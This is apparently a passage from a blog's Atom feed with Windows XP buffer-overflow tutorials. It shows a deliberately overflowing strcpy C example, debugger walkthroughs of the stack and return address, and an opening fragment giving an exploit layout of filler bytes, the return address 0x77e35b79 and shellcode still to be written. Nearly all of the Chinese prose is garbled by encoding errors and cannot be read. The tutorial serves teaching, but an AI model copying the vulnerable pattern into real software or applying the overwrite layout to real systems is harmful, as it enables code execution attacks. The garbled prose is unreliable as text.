åˆ°è¿™é‡Œå¯ä»¥å…ˆæ€»ç»“ä¸€ä¸‹æˆ‘ä»¬å³å°†ç¼–å†™<code>name</code>æ•°ç»„ä¸­çš„å†…å®¹äº†ï¼Œç»è¿‡ä»¥ä¸Šåˆ†æå¯çŸ¥é“ï¼Œå…¶å½¢å¼ä¸º<code>betaobetaobeXXXXShellcode...</code>,å‰é¢12ä¸ªä¸ºä»»æ„å­—ç¬¦ï¼ŒXXXXè¿”å›åœ°å€æˆ‘ä»¬ä½¿ç”¨<code>0x77e35b79</code></p><p>è€Œ<code>Shellcode....</code>ä¾¿æ˜¯æˆ‘ä»¬æƒ³è¦è®¡ç®—æœºæ‰§è¡Œçš„ä»£ç ã€‚shellcodeç¼–å†™å¾…æ›´â€¦(éœ€è¦æ±‡ç¼–åŸºç¡€)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æˆ‘ä»¬è¿™æ¬¡çš„ç¯å¢ƒè·Ÿä¸Šä¸€ç¯‡ä¸€æ ·ï¼Œä¸Šä¸€ç¯‡åªæ˜¯åˆ†æäº†å‘ç”Ÿçš„åŸå› ï¼Œè¿™ä¸€ç¯‡æˆ‘ä»¬å°±å¯¹äº§ç”Ÿç¼“å†²åŒºæº¢å‡ºè¿›è¡Œåˆ©ç”¨ï¼Œè¿˜æ˜¯ä¹‹å‰é‚£ä¸¤ä¸ªç¨‹åº&lt;code&gt;test1.exe&lt;/code&gt; and &lt;code&gt;test2.exe&lt;/code&gt;çš„åŸºç¡€ä¸Šè¿›è¡Œè®²è§£ï¼Œæ‰€ä»¥ä¸Šä¸€ç¯‡ä¸€å®šè¦ç†è§£ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;ç¼“å†²</summary>
      
    
    
    
    <category term="ç½‘ç»œå®‰å…¨" scheme="https://taonn.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="æº¢å‡ºæ”»å‡»" scheme="https://taonn.github.io/tags/%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>ç¼“å†²åŒºæº¢å‡ºåŸç†åˆ†æ(ä¸€)</title>
    <link href="https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/"/>
    <id>https://taonn.github.io/2020/10/06/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90-%E4%B8%80/</id>
    <published>2020-10-06T00:25:57.000Z</published>
    <updated>2021-03-16T05:28:01.309Z</updated>
    
    <content type="html"><![CDATA[<p> ä»€ä¹ˆæ˜¯ç¼“å†²åŒºæº¢å‡ºï¼Ÿï¼Ÿï¼Ÿå…ˆä½œä¸‹ç±»æ¯”ï¼Œå¦‚æœæŸä¸ªäººæŠŠä¸€ç“¶å•¤é…’å…¨éƒ¨å€’å…¥ä¸€ä¸ªå°æ¯å­ä¸­ï¼Œé‚£è£…ä¸ä¸‹çš„å•¤é…’å°±ä¼šå››å¤„å†’å‡ºï¼Œæµåˆ°æ¡Œå­ä¸Šã€‚</p><p>  åŒæ ·çš„é“ç†ï¼Œåœ¨è®¡ç®—æœºå†…éƒ¨ï¼Œè¾“å…¥æ•°æ®é€šå¸¸è¢«å­˜æ”¾åœ¨ä¸€ä¸ªä¸´æ—¶ç©ºé—´å†…ï¼Œè¿™ä¸ªä¸´æ—¶å­˜æ”¾ç©ºé—´å°±è¢«ç§°ä¸ºç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„é•¿åº¦äº‹å…ˆå·²ç»è¢«ç¨‹åºæˆ–è€…æ“ä½œç³»ç»Ÿå®šä¹‰å¥½äº†ã€‚ç¼“å†²åŒºå°±å¾ˆåƒé‚£ä¸ªå•¤é…’æ¯ï¼Œç”¨æ¥è£…ä¸œè¥¿ï¼Œè€Œä¸”å¤§å°å›ºå®šã€‚</p><p>  å‘ç¼“å†²åŒºå†…å¡«å……æ•°æ®ï¼Œå¦‚æœæ•°æ®çš„é•¿åº¦å¾ˆé•¿ï¼ˆå¦‚åŒé‚£ç“¶å•¤é…’ï¼‰ï¼Œè¶…è¿‡äº†ç¼“å†²åŒºï¼ˆé‚£ä¸ªå•¤é…’æ¯ï¼‰æœ¬èº«çš„å®¹é‡ï¼Œé‚£ä¹ˆç»“æœå°±å¦‚åŒå•¤é…’ä¸€æ ·ï¼Œå››å¤„æº¢å‡ºï¼Œæ•°æ®ä¹Ÿä¼šæº¢å‡ºå­˜å‚¨ç©ºé—´ï¼è£…ä¸ä¸‹çš„å•¤é…’ä¼šæµåˆ°æ¡Œå­ä¸Šï¼Œè€Œè£…ä¸ä¸‹çš„æ•°æ®åˆ™ä¼šè¦†ç›–åœ¨åˆæ³•æ•°æ®ä¸Šï¼Œè¿™å°±æ˜¯ç¼“å†²åŒºå’Œç¼“å†²åŒºæº¢å‡ºçš„é“ç†ã€‚å½“ç„¶åœ¨ç†æƒ³çš„æƒ…å†µä¸‹ï¼Œç¨‹åºæ£€æŸ¥æ¯ä¸ªæ•°æ®çš„é•¿åº¦ï¼Œå¹¶ä¸”ä¸å…è®¸è¶…è¿‡ç¼“å†²åŒºçš„é•¿åº¦å¤§å°ï¼Œå°±åƒåœ¨å€’å•¤é…’çš„æ—¶å€™ï¼Œå•¤é…’è¦å†’å‡ºæ¯å­æ—¶æˆ‘ä»¬å°±åœæ­¢ã€‚ä½†æœ‰äº›ç¨‹åºä¼šå‡è®¾æ•°æ®é•¿åº¦æ€»æ˜¯ä¸æ‰€åˆ†é…çš„å­˜å‚¨ç©ºé—´ç›¸åŒ¹é…ï¼Œè€Œä¸ä½œæ£€æŸ¥ï¼Œä»è€Œä¸ºç¼“å†²åŒºæº¢å‡ºåŸ‹ä¸‹éšæ‚£ã€‚OKï¼Œé‚£æˆ‘ä»¬å¦‚ä½•åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºå‘¢åœ¨ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå°±åƒå•¤é…’ä¼šåˆ°å¤„æµæ»¡æ¡Œé¢ä¸€æ ·ï¼Œæº¢å‡ºçš„æ•°æ®ä¼šè¦†ç›–æ‰ä»»ä½•æ•°æ®ã€æŒ‡é’ˆæˆ–å†…å®¹ã€‚é™¤äº†ç ´åä¹‹å¤–ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´æ²¡æœ‰ä»»ä½•å¥½å¤„ã€‚ä½†æˆ‘ä»¬å¯å¼•å¯¼æº¢å‡ºçš„æ•°æ®ï¼Œä½¿è®¡ç®—æœºæ‰§è¡Œæˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚è¿™å°±æ˜¯å¾ˆå¤šæ¼æ´å…¬å‘Šä¸Šè¯´çš„ï¼šâ€˜é»‘å®¢å¯ä»¥ç”¨ç²¾å¿ƒæ„é€ çš„æ•°æ®â€¦â€¦</p><p>â€‹                                                                                - &gt; æ‘˜é€‰è‡ª ç‹ç‚œè€å¸ˆçš„ã€Š<em>Qç‰ˆç¼“å†²åŒº</em>æº¢å‡ºæ•™ç¨‹ã€‹</p><h2 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h2><blockquote><p>æ“ä½œæœºï¼š windows XP</p><p>å·¥å…·ï¼š <a href="https://www.52pojie.cn/thread-675251-1-1.html">DA</a> pro , <a href="https://www.52pojie.cn/thread-350397-1-1.html">OllyDbg</a>ï¼Œvc++6.0ï¼› </p><p>æµ‹è¯•è½¯ä»¶ï¼štest1.exe,    test2.exe</p></blockquote><p>æˆ‘ä»¬ä¸‹é¢çš„å®éªŒæ˜¯é€šè¿‡ç¼–å†™ä¸¤ä¸ªCä¾‹ç¨‹åºï¼Œä½¿ç”¨å·¥å…·ODï¼ŒIDA proè¿›è¡Œé€†å‘åˆ†æã€‚é’ˆå¯¹æ±‡ç¼–è¯­å¥ä¸­CALLæœºåˆ¶å‰–æç¼“å†²åŒºæº¢å‡ºçš„åŸºæœ¬åŸç† ã€‚</p><h2 id="å®éªŒå‡†å¤‡ï¼š"><a href="#å®éªŒå‡†å¤‡ï¼š" class="headerlink" title="å®éªŒå‡†å¤‡ï¼š"></a>å®éªŒå‡†å¤‡ï¼š</h2><p>ç¼–å†™Cä»£ç ç¨‹åºï¼Œç¼–è¯‘</p><p>test1.c,ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betao&quot;</span>;  <span class="comment">//å®šä¹‰å…¨å±€å˜é‡</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//è¿”å›å€¼ ä¸»å‡½æ•°main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//è¾“å‡º</span></span><br><span class="line">    getchar();               <span class="comment">//æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥ä¸Štest1.cä»£ç ä¸­ï¼Œå› ä¸ºâ€™betaoâ€™ä¸ºè¶…è¿‡bufferçš„ç©ºé—´ï¼Œæ‰€ä»¥ä¸ä¼šå¼•èµ·ç¼“å†²åŒºæº¢å‡º</p></blockquote><p>test2.cä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; //å¼•å…¥å¤´æ–‡ä»¶</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[] = <span class="string">&quot;betaobetaobetao&quot;</span>;  <span class="comment">//å®šä¹‰å…¨å±€å˜é‡,ï¼ï¼ï¼ æ³¨æ„ï¼Œè¿™é‡Œå¤šäº†ä¸¤ä¸ªbetao</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>            <span class="comment">//è¿”å›å€¼ ä¸»å‡½æ•°main()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">8</span>];   <span class="comment">//å¼€è¾Ÿ8ä¸ªå­—èŠ‚çš„ç©ºé—´ç”¨æ¥å­˜å‚¨å˜é‡name</span></span><br><span class="line">    <span class="built_in">strcpy</span>(buffer,name);  <span class="comment">//å†…ç½®å‡½æ•°ï¼ˆä½œç”¨ï¼‰ï¼šå°†å˜é‡nameå†…å®¹èµ‹å€¼ç»™bufferå˜é‡</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,buffer);  <span class="comment">//è¾“å‡º</span></span><br><span class="line">    getchar();               <span class="comment">//æ–¹ä¾¿è§‚å¯Ÿ ä½œç”¨ï¼šç­‰å¾…ç”¨æˆ·è¾“å…¥æŒ‰é”®</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;                <span class="comment">//è¿”å›å€¼</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥ä¸Štest2.cä»£ç ï¼Œå› ä¸ºcopyç»™bufferè¶…å‡ºäº†ç©ºé—´ï¼Œæ‰€ä»¥å¯¼è‡´ç¼“å†²åŒºæº¢å‡º</p></blockquote><p>å°†Cè¯­è¨€ä»£ç ä½¿ç”¨vc++6.0ç¼–ç¨‹æˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œå¤§æ¦‚æ­¥éª¤</p><blockquote><p>æ–°å»ºwin32 console application -&gt; æ–°å»º C++ æºæ–‡ä»¶ -&gt; ç¼–å†™ä»£ç   -&gt; ç¼–è¯‘(é€‰æ‹©win32 Debug) -&gt; ç”Ÿæˆexeå¯æ‰§è¡Œæ–‡ä»¶</p><p><strong>ç¼–è¯‘é€‰æ‹©win32 debugæ“ä½œå¦‚ä¸‹ï¼š</strong></p><p> å³é”®ç‚¹å‡»èœå•ç©ºç™½å¤„â€”â€”é€‰æ‹©â€œç»„å»ºâ€â€”â€”é€‰æ‹©â€œWin32 Debugâ€œâ€”â€”é‡æ–°ç¼–è¯‘é“¾æ¥</p></blockquote><p>  é¦–å…ˆï¼Œæˆ‘ä»¬å…ˆæ¥è¿è¡Œä¸€äº›ç¼–è¯‘å¥½äº†çš„å¯æ‰§è¡Œæ–‡ä»¶<code>test1.exe</code> and <code>test2.exe</code>ï¼Œçœ‹çœ‹ä¸¤è€…åŒºåˆ«</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220211457759.png" alt="image-20191220211457759"></p><p>ç¬¬ä¸€ä¸ªç¨‹åºï¼Œæ²¡æœ‰ä»»ä½•å¼‚å¸¸</p><p>   å¯è§ç¨‹åºå·²ç»å¾—åˆ°äº†æ­£ç¡®çš„æ‰§è¡Œä¸è¾“å‡ºã€‚ä½†æ˜¯æˆ‘åœ¨ç¨‹åºä¸­æ‰€åˆ›å»ºå‡ºæ¥çš„æ˜¯ä¸€ä¸ª8å­—èŠ‚é•¿åº¦çš„æ•°ç»„ï¼Œè€Œæˆ‘åœ¨ç¨‹åºä¸­çš„è¾“å…¥æ˜¯5ä¸ªå­—èŠ‚ã€‚å¦‚æœæˆ‘çš„è¾“å…¥è¶…è¿‡å…«ä¸ªå­—èŠ‚ä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ</p><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ‰§è¡Œç¬¬äºŒä¸ªç¨‹åº</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220211551187.png" alt="image-20191220211551187"></p><p>å¯è§ï¼Œç¨‹åºè™½ç„¶ä¹Ÿèƒ½å¤Ÿæ­£ç¡®è¾“å‡ºï¼Œä½†æ˜¯å´å¼¹å‡ºäº†é”™è¯¯æç¤ºå¯¹è¯æ¡†ã€‚ä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µï¼Ÿæˆ‘ä»¬æ¥ä¸‹æ¥å°±æ¥ç ”ç©¶ä¸€ä¸‹ã€‚</p><p>æˆ‘ä»¬é¦–å…ˆåˆ†æä¸€ä¸‹æ— å¼‚å¸¸çš„ç¨‹åºï¼Œä¹Ÿå°±æ˜¯<code>test1.exe</code>ï¼Œè¿™é‡Œæˆ‘ä»¬ä½¿ç”¨ollydbgæ¥åˆ†æ</p><p>å°†<code>test1.exe</code>è½½å…¥ollydbgä¸­ï¼Œollydbgè½½å…¥æ–¹å¼æœ‰ä¸¤ç§ï¼š</p><ul><li>é¼ æ ‡ç›´æ¥å°†exeæ‰§è¡Œç¨‹åºæ‹–å…¥ODæ§ä»¶åŒºåŸŸ</li><li>æ–‡ä»¶     -&gt;    é™„åŠ     -&gt;    é€‰æ‹©è¿è¡Œä¸­çš„ç¨‹åº</li></ul><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220212336225.png" alt="image-20191220212336225"></p><p> å› ä¸ºæˆ‘ä»¬éœ€è¦ä»mainå‡½æ•°å¼€å§‹åˆ†æï¼Œè€Œä¸Šå›¾ï¼š004015B0åœ°å€ä¸ºè½¯ä»¶åˆå§‹è¿è¡Œåœ°å€ï¼Œå¹¶émainå‡½æ•°çš„èµ·å§‹åœ°å€ã€‚æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾mainå‡½æ•°çš„å†…å­˜åœ°å€ã€‚æˆ‘ä»¬ä½¿ç”¨ IDA Pro æ‰“å¼€ç¨‹åºå¯»æ‰¾ï¼Œå½“ç„¶æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°æŒ‰F8å•æ­¥æ‰§è¡Œï¼Œé€šè¿‡è§‚å¯Ÿè·å–ï¼Œä½†æ˜¯è¿™æ ·æœªå…éœ€è¦ä¸€å®šçš„ç»éªŒï¼Œè€Œä¸”ä¹Ÿæ¯”è¾ƒéº»çƒ¦ã€‚æ‰€ä»¥æˆ‘ä»¬å°†ç¨‹åºæ‹–å…¥IDAä¸­</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213005763.png" alt="image-20191220213005763"></p><p>å¦‚æœä¸æ˜¯å›¾ä¸Šçš„æƒ…å†µï¼Œè€Œæ˜¯å›¾ä¸‹çš„æƒ…å†µï¼ŒæŒ‰ä¸€ä¸‹ç©ºæ ¼é”®ï¼Œå³å¯è°ƒå‡ºå›¾ä¸Šå†…å®¹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220212914884.png" alt="image-20191220212914884"></p><p>åŒå‡»è¿›å…¥å¦‚ä¸‹é¡µé¢ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213151974.png"></p><p>æŒ‰ä¸‹ç©ºæ ¼é”®</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220213345908.png" alt="image-20191220213345908.png"></p><p>å¯è§,IDAå·²ç»å¸®æˆ‘ä»¬è·å–äº†mainå‡½æ•°çš„å…¥å£åœ°å€ï¼Œå³<code>0x00401010  </code>,æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ‡æ¢åˆ°ODä¸­ï¼Œ<code>Ctrl + G</code> è¾“å…¥<code>401010</code>è·³åˆ°è¯¥ä½ç½®ï¼ŒæŒ‰F2è®¾ç½®ä¸€ä¸ªæ–­ç‚¹( æŸä¸ªå†…å­˜åœ°å€ä¸‹äº†F2æ–­ç‚¹,å½“ç¨‹åºè¿è¡Œåˆ°æ­¤å¤„çš„æ—¶å€™å°±ä¼šæ–­ä¸‹æ¥ )</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214324018.png" alt="image-20191220214324018"></p><p>ç”±ä¸Šé¢çš„æˆªå›¾ï¼Œæˆ‘ä»¬é™¤äº†å¯ä»¥çŸ¥é“mainå‡½æ•°çš„ä½ç½®å¤–ï¼Œæˆ‘ä»¬è¿˜ä»ä¸‹é¢é‚£æ®µè¯â€œè·³è½¬æ¥è‡ª 00401005â€ï¼ˆè‹±æ–‡ç‰ˆçš„æ˜¯ï¼šjump from 00401005ï¼‰å¾—çŸ¥mainå‡½æ•°æ˜¯ç”±ä½äº0x00401005ä½ç½®å¤„çš„è¯­å¥è·³è¿‡æ¥çš„ã€‚ç”±äºç¼“å†²åŒºæº¢å‡ºæ˜¯ä¸æ ˆç©ºé—´ç´§å¯†ç›¸å…³çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç°åœ¨åº”å½“åˆ†æè°ƒç”¨ï¼ˆCALLï¼‰mainå‡½æ•°å‰åï¼Œæ ˆç©ºé—´çš„æƒ…å†µï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦å®šä½ç©¶ç«Ÿæ˜¯å“ªæ¡è¯­å¥è°ƒç”¨äº†mainå‡½æ•°ã€‚å¦‚æœä»…ä»…é€šè¿‡ODï¼Œæˆ‘ä»¬æ˜¯æ¯”è¾ƒéš¾å®šä½çš„ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘è¿˜æ˜¯ä½¿ç”¨IDA Proã€‚</p><p>ç”±äºå·²ç»çŸ¥é“mainå‡½æ•°çš„åœ°å€æ˜¯0x00401010ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨IDAä¸­ï¼Œç”¨é¼ æ ‡åœ¨è¯¥åœ°å€ç‚¹ä¸€ä¸‹ï¼Œä¹‹ååˆ©ç”¨å¿«æ·é”®â€œCtrl+Xâ€æ‰“å¼€â€œäº¤å‰å¼•ç”¨çª—å£â€ï¼Œå°±æ¥åˆ°äº†jmpåˆ°æ­¤çš„å‡½æ•°ä½ç½®ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214521642.png" alt="image-20191220214521642"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214544784.png" alt="image-20191220214544784"></p><p>ç„¶ååœ¨0x00401005çš„åœ°å€å¤„ï¼Œå†æ¬¡åˆ©ç”¨â€œäº¤å‰å¼•ç”¨â€åŠŸèƒ½ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿæ‰¾åˆ°è°ƒç”¨mainå‡½æ•°çš„ä½ç½®äº†ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220214634601.png" alt="image-20191220214634601"></p><p>ä½äº <code>0x00401694</code>å¤„çš„è¯­å¥è°ƒç”¨äº†mainå‡½æ•°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥æˆ‘ä»¬åœ¨ODä¸­æ¥åˆ†æå †æ ˆçš„æƒ…å†µ</p><p>ç»§ç»­<code>Ctrl + G</code> è¾“å…¥ 401694 è·³è½¬åˆ°æ‰§è¡Œmainå‡½æ•°çš„å†…å­˜åœ°å€ï¼ŒF2è®¾ç½®æ–­ç‚¹</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220215539618.png" alt="image-20191220215539618"></p><p>æ³¨æ„ä¸Šå›¾ä¸­ çº¢è‰²ç®­å¤´å’Œé»„è‰²ç®­å¤´çš„åœ°æ–¹</p><p>â€‹        çº¢è‰²ç®­å¤´ CALLè¯­å¥ä¸‹é¢çš„åœ°å€æ˜¯0x00401699ã€‚è¿™ä¸ªåœ°å€å¾ˆé‡è¦ï¼Œä¸ºä»€ä¹ˆé‡è¦å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬çš„ç¨‹åºåœ¨è¿›å…¥æ¯ä¸€ä¸ªCALLä¹‹å‰ï¼Œéƒ½ä¼šé¦–å…ˆå°†CALL<strong>ä¸‹é¢é‚£æ¡è¯­å¥çš„åœ°å€å…¥æ ˆ</strong>ï¼Œç„¶å<strong>å†æ‰§è¡ŒCALLè¯­å¥</strong>ã€‚è¿™æ ·å½“CALLæ‰§è¡Œå®Œåï¼Œç¨‹åºå†å°†è¯¥åœ°å€å‡ºæ ˆï¼Œè¿™æ ·å°±èƒ½å¤ŸçŸ¥é“ä¸‹ä¸€æ­¥åº”è¯¥æ‰§è¡Œå“ªæ¡æŒ‡ä»¤. æˆ‘ä»¬ä¸€èˆ¬ä¹Ÿå°†è¿™ä¸ªåœ°å€ç§°ä¸ºâ€œè¿”å›åœ°å€â€ï¼Œå®ƒå‘Šè¯‰ç¨‹åºï¼šâ€œCALLæ‰§è¡Œå®Œåï¼Œè¯·æ‰§è¡Œè¿™ä¸ªåœ°å€å¤„çš„è¯­å¥ã€‚â€  </p><p>æˆ‘ä»¬æŒ‰ä¸‹F9ï¼Œè·³è½¬åˆ°æ­¤ä½ç½®ï¼ŒæŸ¥çœ‹æ ˆä¸­å†…å®¹ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220215928730.png" alt="image-20191220215928730"></p><p>æˆ‘ä»¬æ¥ä¸‹æ¥æŒ‰F7ï¼Œè¿›å…¥è¿™ä¸ªCALL,æ­¤æ—¶å†çœ‹ä¸€ä¸‹æ ˆç©ºé—´(æ³¨ï¼šæ ˆç©ºé—´ç”±ä¸‹è‡³ä¸Šæ˜¯é«˜åœ°å€å¾€ä½åœ°å€å¤„èµ°çš„  )</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220220111419.png" alt="image-20191220220111419"></p><p>æ˜¯ä¸Šä¸Šå›¾CALLè¯­å¥ä¸‹ä¸€ä¸ªå†…å­˜åœ°å€å“¦ï¼Œç”±æ­¤å¯è§ï¼Œè¿”å›åœ°å€0x00401669å·²ç»å…¥æ ˆ .</p><h2 id="åˆ†æmainå‡½æ•°çš„ç¼“å†²åŒºæƒ…å†µ"><a href="#åˆ†æmainå‡½æ•°çš„ç¼“å†²åŒºæƒ…å†µ" class="headerlink" title="åˆ†æmainå‡½æ•°çš„ç¼“å†²åŒºæƒ…å†µ"></a>åˆ†æmainå‡½æ•°çš„ç¼“å†²åŒºæƒ…å†µ</h2><p>  å› ä¸ºæˆ‘ä»¬åœ¨æºç¨‹åºä¸­åˆ›å»ºäº†ä¸€ä¸ª8ä¸ªå­—èŠ‚å¤§å°çš„æ•°ç»„ï¼Œå› æ­¤è¿›å…¥mainå‡½æ•°åçš„é¦–è¦å·¥ä½œå°±æ˜¯ä¸ºè¿™ä¸ªå±€éƒ¨å˜é‡åˆ†é…ç©ºé—´ã€‚ç”±äºæˆ‘ä»¬çš„ç¨‹åºæ˜¯ä»¥Debugå½¢å¼ç¼–è¯‘çš„ï¼Œæ‰€ä»¥å®ƒä¼šå¤šåˆ†é…ä¸€äº›ç©ºé—´ï¼ˆReleaseç‰ˆæœ¬åˆ™ä¼šåˆ†é…æ­£å¥½çš„ç©ºé—´ï¼‰ã€‚ç»“åˆæœ¬ç¨‹åºå¯ä»¥çœ‹åˆ°ï¼Œå®ƒä¸ºæˆ‘ä»¬åˆ†é…çš„å±€éƒ¨å˜é‡ç©ºé—´å¤§å°ä¸º0x4C(7C - 34)-&gt;ï¼ˆF8ä¸€æ­¥æ­¥å‘ä¸‹æ‰§è¡Œï¼‰ï¼š</p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220220929691.png" alt="image-20191220220929691"></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220221935424.png" alt="image-20191220221935424"></p><p>  åœ¨ä¸Šå›¾ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„æ˜¯æœ€åä¸¤è¡Œã€‚å…¶ä¸­æœ€åä¸€è¡Œåœ¨ä¹‹å‰å·²ç»è¯´è¿‡äº†ï¼Œæ˜¯éå¸¸é‡è¦çš„<strong>è¿”å›åœ°å€</strong>ï¼Œå®ƒå†³å®šäº†å½“mainå‡½æ•°æ‰§è¡Œå®Œæ¯•åï¼Œç¨‹åºæ‰€è¦æ‰§è¡Œçš„è¯­å¥çš„åœ°å€ï¼Œè€Œå€’æ•°ç¬¬äºŒè¡Œæ˜¯çˆ¶å‡½æ•°çš„EBP ã€‚</p><p>  å†å¾€ä¸Šï¼Œå°±æ˜¯æˆ‘ä»¬çš„mainå‡½æ•°çš„å±€éƒ¨å˜é‡ç©ºé—´ã€‚è¿™é‡Œå¤§å®¶å¯èƒ½ä¼šæœ‰ç–‘æƒ‘ï¼Œæ—¢ç„¶æ˜¯åˆ†é…ç»™æˆ‘ä»¬çš„ç©ºé—´ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿˜ä¼šæœ‰å…¶å®ƒçš„æ•°æ®å‘¢ï¼Ÿ  æˆ‘ä»¬ç»§ç»­å¾€ä¸‹æ‰§è¡Œ ,å½“æˆ‘ä»¬æ‰§è¡Œå®Œ<code>0x401026</code></p><p><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222344195.png" alt="image-20191220222344195"><img src="https://gitee.com/bobtaoi/md_img/raw/master/img//image-20191220222551168.png" alt="image-20191220222551168"></p><p>0X4Cçš„ç©ºé—´å¤§å°(7C - 34), è¿™æ®µç©ºé—´éƒ½è¢«0xCCå¡«å……äº†ã€‚è¿™æ˜¯å› ä¸ºç¨‹åºä¸ºäº†å®¹é”™æ€§ä¸ä¿æŒè‡ªèº«çš„å¥å£®æ€§ï¼Œäºæ˜¯åˆ©ç”¨0xCCï¼Œå³int 3æ–­ç‚¹æ¥å¡«å……æ»¡è¿™æ®µåŒºåŸŸï¼Œè¿™æ 